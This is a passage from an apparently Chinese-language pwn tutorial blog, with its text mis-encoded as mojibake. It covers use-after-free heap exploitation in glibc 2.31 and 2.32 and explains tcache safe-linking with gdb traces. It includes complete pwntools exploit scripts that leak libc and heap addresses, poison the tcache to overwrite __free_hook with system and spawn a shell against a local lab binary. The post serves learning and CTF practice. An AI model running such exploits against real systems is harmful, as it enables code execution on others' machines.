binå¤§å°çš„chunkï¼Œåˆ©ç”¨UAFæ³„éœ²libcåŸºå€ï¼Œæœ€åé€šè¿‡ä¿®æ”¹tcacheçš„æŒ‡é’ˆè½»æ¾çš„å°†å †å—ç”³è¯·åˆ°__free_hookï¼Œä¿®æ”¹ä¸ºsystemåœ°å€ï¼Œç„¶åfreeä¸€ä¸ªchunkï¼Œchunkçš„å†…å®¹ä¸ºâ€/bin/sh\x00â€å³å¯è½»æ¾getshellã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>â€‹    æ³„éœ²libcåœ°å€</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;======================== LEAK HEAP ADDRESS ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x80</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x10</span>, <span class="string">&#x27;protected&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x40</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">138</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;LIBC:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br></pre></td></tr></table></figure><p>â€‹    ä¿®æ”¹nextæŒ‡é’ˆä¸º__free_hook</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;======================== TCACHE ATTACK ========================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">6</span>, p64(__free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;hacker&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, p64(system))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>â€‹    å®Œæ•´expå¦‚ä¸‹ä»…ä¾›å‚è€ƒï¼Œç”±äºæ•´ä¸ªç¨‹åºåœ¨å †å—ç¼–è¾‘çš„è¿‡ç¨‹ä¸­é™åˆ¶å¾ˆå®½æ¾ï¼Œå¤§å®¶å¯ä»¥è‡ªå·±å†™å‡ºæ›´å¤šç§exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./UAF_glibc2.31&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== LEAK HEAP ADDRESS ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x80</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x10</span>, <span class="string">&#x27;protected&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x40</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">138</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;LIBC:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== TCACHE ATTACK ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">6</span>, p64(__free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;hacker&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, p64(system))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    æœ€åè°ˆä¸€ä¸‹libc2.27å’Œlibc2.31çš„ä¸€äº›å°tipsï¼Œå½“æˆ‘ä»¬æ”»å‡»tcache_perthread_structæ—¶ï¼Œå¾ˆå¸¸è§çš„ä¸€ä¸ªåšæ³•å°±æ˜¯æ¥å°†å…¶è®°å½•countsçš„åŒºåŸŸå…¨éƒ¨è¦†ç›–å¡«æ»¡ï¼Œè¿™æ ·æˆ‘ä»¬å†æ¬¡ç”³è¯·çš„chunkå¯é€ƒé€¸å‡ºtcacheï¼Œåœ¨libc2.27ä¸­counts[TCACHE_MAX_BINS]çš„ç±»å‹ä¸ºcharï¼Œå³åœ¨ç›¸åº”sizeçš„ä½ç½®ä¸Šè®°å½•æ•°é‡çš„å¤§å°æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œè€Œåœ¨libc2.31ä¸­ç›¸åº”çš„ç±»å‹ä¸ºuint16_tï¼Œå¤§å°æ˜¯ä¸¤ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹‹å‰çš„payloadé€šå¸¸æ˜¯<code>b&quot;\x07&quot; * 0x40</code>ï¼ˆä»trcache_perthread_structçš„æ•°æ®åŒºå¼€å§‹å¡«å……ï¼‰ï¼Œåœ¨libc2.31ä¸­ï¼Œpayloadéœ€è¦æ”¹å†™æˆ<code>b&quot;\x07&quot; * 0x80</code>ï¼Œå› ä¸ºå¤§å°å¤šäº†ä¸€å€ï¼Œä¹Ÿç›¸åº”çš„éœ€è¦å¢åŠ paddingã€‚</p><p><img src="https://i.loli.net/2021/05/18/bVhP95jX3nJzpQk.png" alt=""></p><h2 id="2-32"><a href="#2-32" class="headerlink" title="2.32"></a>2.32</h2><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><ul><li><p>æºç ä¸‹è½½</p><p><a href="https://ftp.gnu.org/gnu/glibc/">https://ftp.gnu.org/gnu/glibc/</a></p></li></ul><p>ä¸‹è½½å¥½æºç åæ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ç”¨äºå­˜æ”¾æºç </p><p>æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ç”¨äºå­˜æ”¾ç¼–è¯‘åçš„libc</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /glibc/glibc-2.32_src/       # æºç åœ¨è¿™</span><br><span class="line">sudo mkdir build</span><br><span class="line">cd build </span><br><span class="line">CFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og&quot;</span><br><span class="line">CXXFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og&quot;</span><br><span class="line">sudo ../configure --prefix=/glibc/2.32/# å­˜æ”¾ç¼–è¯‘åçš„libc</span><br></pre></td></tr></table></figure><p>â€‹    è‹¥æƒ³è°ƒè¯•mallocå’Œfreeçš„è¿‡ç¨‹ï¼Œè¿›å…¥gdbå<code>directory /glibc/glibc-2.32_src/malloc/</code>ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªä½ç½®å¡«æˆ‘ä»¬ä¸‹è½½çš„glibcæºç è·¯å¾„ã€‚</p><p>â€‹    è®°å¾—binaryç¨‹åºéœ€è¦ä½¿ç”¨patchelfä¿®æ”¹ldåŠ è½½å™¨å’Œlibc</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter /glibc/2.32/lib/ld-2.32.so</span><br><span class="line">LD_PRELOAD=/glibc/2.32/lib/libc-2.32.so ./binary</span><br></pre></td></tr></table></figure><h3 id="è·Ÿè¸ªè°ƒè¯•"><a href="#è·Ÿè¸ªè°ƒè¯•" class="headerlink" title="è·Ÿè¸ªè°ƒè¯•"></a>è·Ÿè¸ªè°ƒè¯•</h3><p>â€‹    æˆ‘ä»¬ç®€å•å†™ä¸€ä¸ªmallocå’Œfreeçš„demoç¤ºä¾‹ç¨‹åºï¼Œä½¿ç”¨gdbæ¥è°ƒè¯•mallocå’Œfreeçš„è¿‡ç¨‹ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span>* p[<span class="number">20</span>];</span><br><span class="line">p[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">p[<span class="number">1</span>] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">free</span>(p[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">free</span>(p[<span class="number">1</span>]);</span><br><span class="line">p[<span class="number">2</span>] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">In file: /home/lemon/Documents/pwn/UAF/2.32/tcache_32.c</span><br><span class="line">    3 int main()</span><br><span class="line">    4 &#123;</span><br><span class="line">    5 void* p[20];</span><br><span class="line">    6 p[0] = malloc(0x80);</span><br><span class="line">    7 p[1] = malloc(0x80);</span><br><span class="line"> â–º  8 free(p[0]);</span><br><span class="line">    9 free(p[1]);</span><br><span class="line">   10 p[2] = malloc(0x80);</span><br><span class="line">   11 &#125;</span><br></pre></td></tr></table></figure><h4 id="freeè¿‡ç¨‹"><a href="#freeè¿‡ç¨‹" class="headerlink" title="freeè¿‡ç¨‹"></a>freeè¿‡ç¨‹</h4><p>â€‹    æˆ‘ä»¬å®šä½åˆ°ç¬¬å…«è¡Œåï¼ŒæŒ‰sæ­¥å…¥freeçš„è¿‡ç¨‹</p><p><img src="https://i.loli.net/2021/05/18/qeVOXbG4sAl7h9j.png" alt=""></p><p>â€‹    ä¸€ç›´èµ°åˆ°_int_freeå‡½æ•°ï¼Œæ­¥å…¥æ­¤å‡½æ•°</p><p><img src="https://i.loli.net/2021/05/18/yLlNk7QcovAWqhJ.png" alt=""></p><p>â€‹    å‘åè¿è¡Œï¼Œå‡†å¤‡è°ƒç”¨tcache_putå‡½æ•°å°†å½“å‰å‡†å¤‡freeçš„chunkæ”¾å…¥tcacheç»“æ„ä½“ä¸­</p><p><img src="https://i.loli.net/2021/05/18/uNDrFyIVwe9odXG.png" alt=""></p><p>â€‹    tcacheç›¸å…³çš„ç»“æ„ä½“å¦‚ä¸‹ï¼Œå¯ä»¥å‘ç°å…¶å®ç›¸å¯¹äºlibc-2.31çš„ä»£ç tcacheç»“æ„ä½“æ²¡æœ‰å‘ç”Ÿå˜åŒ–</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>â€‹    åœ¨libc2.32ä¸­ï¼Œtcache_putå‡½æ•°å¦‚ä¸‹ï¼Œå¯ä»¥å‘ç°ç›¸å¯¹äºlibc-2.31çš„ä»£ç ï¼Œkeyçš„å€¼è¿˜æ˜¯èµ‹å€¼ä¸ºtcacheï¼Œä½†æ˜¯eçš„nextæŒ‡é’ˆå‘ç”Ÿäº†å˜åŒ–ï¼Œä¸å†æ˜¯ä¸‹ä¸€ä¸ªtcacheçš„åœ°å€ï¼Œè€Œæ˜¯å¼•å…¥äº†ä¸€ä¸ªå®<code>PROTECT_PTR</code>ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    æˆ‘ä»¬æ‰¾åˆ°ç›¸åº”çš„å®å®šä¹‰</p><p><img src="https://i.loli.net/2021/05/18/q9Xp6HOrJyRMIDQ.png" alt=""></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line">  ((__typeof (ptr)) ((((<span class="keyword">size_t</span>) pos) &gt;&gt; <span class="number">12</span>) ^ ((<span class="keyword">size_t</span>) ptr)))</span><br></pre></td></tr></table></figure><p>â€‹    </p><p>â€‹    è¿™ä¸ªå®å®šä¹‰å°±æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°å³ç§»12ä½å†å’Œç¬¬äºŒä¸ªå‚æ•°åšä¸€æ¬¡å¼‚æˆ–ï¼Œä¹Ÿå°±æ˜¯è¯´e-&gt;nextä¼šæŒ‡å‘è¿™ä¸ªå€¼ï¼Œæˆ‘ä»¬åœ¨gdbä¸­æŸ¥çœ‹ï¼Œå‘ç°ç¡®å®å˜ä¸ºäº†ä¸€ä¸ªå¥‡æ€ªçš„å€¼ã€‚</p><p><img src="https://i.loli.net/2021/05/18/gwuRz9n4ByAaslP.png" alt=""></p><p>â€‹    æˆ‘ä»¬å¯ä»¥æ¥éªŒè¯ä¸€ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br></pre></td></tr></table></figure><p>â€‹    ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯&amp;e-&gt;nextï¼Œä¹Ÿå°±æ˜¯è¿™ä¸€ä¸ªä½ç½®çš„åœ°å€ï¼Œä¸º0x55555555a2a0ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯tcache-&gt;entries[tc_idx]ï¼Œå› ä¸ºå½“å‰tcacheçš„é“¾è¡¨å…¶å®æ˜¯ç©ºçš„ï¼ˆä¹‹å‰è¿˜æ²¡æœ‰freeè¿‡chunkï¼‰ï¼Œæ‰€ä»¥ç¬¬äºŒä¸ªå‚æ•°å€¼ä¸º0ï¼Œæˆ‘ä»¬ç”¨å®å®šä¹‰åšä¸€ä¸ªè¿ç®—ï¼Œå°†ç¬¬ä¸€ä¸ªå‚æ•°å³ç§»12ä½åå¼‚æˆ–0ï¼Œå‘ç°å¾—å‡ºçš„å€¼ä¸å¡«å…¥e-&gt;nextçš„å€¼ä¸€è‡´ã€‚</p><p><img src="https://i.loli.net/2021/05/18/Qx1azgpFm2LR3nV.png" alt=""></p><p>â€‹    </p><p>â€‹    æ‰§è¡Œå®Œtcache_putå‡½æ•°åå°±returnäº†ã€‚å€¼å¾—å…³æ³¨çš„æ˜¯libc2.32çš„safe-linkingæœºåˆ¶ï¼Œå°±æ˜¯åœ¨e-&gt;nextä½ç½®ä¸å†ç›´ç™½çš„æ’å…¥ä¸‹ä¸€å—chunkçš„åœ°å€ï¼Œè€Œæ˜¯åˆ©ç”¨äº†åœ°å€éšæœºåŒ–æŠ€æœ¯ï¼Œå°†å½“å‰åœ°å€å³ç§»åä¸tcacheé“¾è¡¨å°¾éƒ¨çš„åœ°å€åšäº†ä¸€æ¬¡å¼‚æˆ–å†æ’å…¥é“¾è¡¨å°¾éƒ¨ã€‚</p><p>â€‹    æˆ‘ä»¬çœ‹mallocæ—¶å‘ç”Ÿäº†ä»€ä¹ˆã€‚</p><h4 id="mallocè¿‡ç¨‹"><a href="#mallocè¿‡ç¨‹" class="headerlink" title="mallocè¿‡ç¨‹"></a>mallocè¿‡ç¨‹</h4><p>â€‹    èµ°åˆ°è¿™é‡Œå‡†å¤‡å•æ­¥è¿›å…¥mallocå‡½æ•°</p><p><img src="https://i.loli.net/2021/05/18/rRahfLOAGSXTsWN.png" alt=""></p><p>â€‹    å‡†å¤‡è¿›å…¥tcache_getå‡½æ•°</p><p><img src="https://i.loli.net/2021/05/18/wg7NEJnHoxlrzVR.png" alt=""></p><p>â€‹    tcache_getå‡½æ•°æºä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    ä¸libc2.31åšå¯¹æ¯”çš„è¯ï¼Œlibc2.31æ˜¯<code>tcache-&gt;entries[tc_idx] = e-&gt;next;</code></p><p>â€‹    è€Œlibc2.32æ˜¯<code>tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</code></p><p>â€‹    å¤šäº†ä¸€ä¸ªå®å®šä¹‰REVEAL_PTRï¼Œæˆ‘ä»¬å±•å¼€åæ˜¯<code>#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</code></p><p>â€‹    æœ¬è´¨è¿˜æ˜¯è°ƒç”¨äº†PROTECT_PTRè¿™ä¸ªå®ï¼Œæˆ‘ä»¬è§‚å¯Ÿå‚æ•°ï¼Œè¿™ä¸ªå®æ˜¯è®©ptrçš„åœ°å€å³ç§»åå’Œptråšä¸€æ¬¡å¼‚æˆ–ï¼Œå³å¯æ¢å¤å‡ºe-&gt;next</p><p>â€‹    æˆ‘ä»¬ç»§ç»­å‘åè¿è¡Œ</p><p>â€‹    æ‰§è¡Œé‚£ä¸ªå®ä¹‹å‰tcache_perthread_structä¸­çš„é“¾è¡¨çš„å€¼æ˜¯å¦‚å›¾æ‰€ç¤ºçš„å€¼</p><p><img src="https://i.loli.net/2021/05/18/6rRutF2BqP5hywD.png" alt=""></p><p>â€‹    æ‰§è¡Œåå‘ç”Ÿå˜åŒ–å¦‚å›¾æ‰€ç¤º</p><p><img src="https://i.loli.net/2021/05/18/wpVvTKlWOfLrFXH.png" alt=""></p><p>â€‹    å®Œæ•´çš„æ„æˆäº†safe-linkingæœºåˆ¶ã€‚</p><h3 id="åˆ©ç”¨æ‰‹æ³•-2"><a href="#åˆ©ç”¨æ‰‹æ³•-2" class="headerlink" title="åˆ©ç”¨æ‰‹æ³•"></a>åˆ©ç”¨æ‰‹æ³•</h3><p>â€‹    åœ¨UAFçš„åœºæ™¯ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨showå³å¯æ³„éœ²å‡ºe-&gt;nextå€¼ï¼Œå› ä¸ºæœ€åˆtcacheé“¾è¡¨æ˜¯ä¸ºç©ºçš„ï¼Œä¹Ÿå°±æ˜¯è¯´safe-linkingæœºåˆ¶åªç›¸å½“äºç”¨å †åœ°å€å³ç§»äº†12ä½ï¼Œé€šè¿‡å·¦ç§»å³å¯æ¢å¤å‡ºå †åœ°å€ï¼Œä»è€Œæ³„éœ²å‡ºå †çš„åŸºå€ï¼Œæ³„éœ²å‡ºå †åœ°å€ä»¥åå°±å¯ä»¥æ¥ä¼ªé€ tcacheçš„nextä½äº†ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨freeæ€çš„chunkä¸­ä¿®æ”¹nextä¸º<code>(&amp;next)&gt;&gt;12 &amp; __free_hook</code>ï¼ˆå› ä¸ºæˆ‘ä»¬æ³„éœ²å‡ºå †åŸºå€æ‰€ä»¥å¯ä»¥è½»æ¾çš„è·å–åˆ°&amp;nextçš„å€¼ï¼‰ï¼Œè¿™æ ·è°ƒç”¨å®Œtcache<em>getä¹‹åå°±å¯ä»¥æŠŠ\</em>_free_hooké“¾å…¥åˆ°å¯ä¾›æˆ‘ä»¬ç”³è¯·çš„é“¾è¡¨å½“ä¸­ï¼Œå³å¯è¦†å†™__free_hookæ¥getshellã€‚</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>â€‹    æ³„éœ²å †åŸºå€</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;======================== LEAK HEAP ADDRESS ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x90</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">5</span>)[-<span class="number">5</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap = heap &lt;&lt; <span class="number">12</span></span><br><span class="line">info(<span class="string">&quot;HEAP BASE ----&gt; &quot;</span> + <span class="built_in">hex</span>(heap))</span><br></pre></td></tr></table></figure><p>â€‹    æ³„éœ²libcåŸºå€</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;======================== LEAK LIBC ADDRESS ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">&#x27;dawn it&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x10</span>, <span class="string">&#x27;protect&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(</span><br><span class="line">    <span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">193</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">info(<span class="string">&quot;LIBC ----&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>â€‹    åˆ©ç”¨UAFä¼ªé€ tcacheçš„nextå€¼ï¼Œè¦†å†™__free_hook</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;======================== TCACHE ATTACK ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span 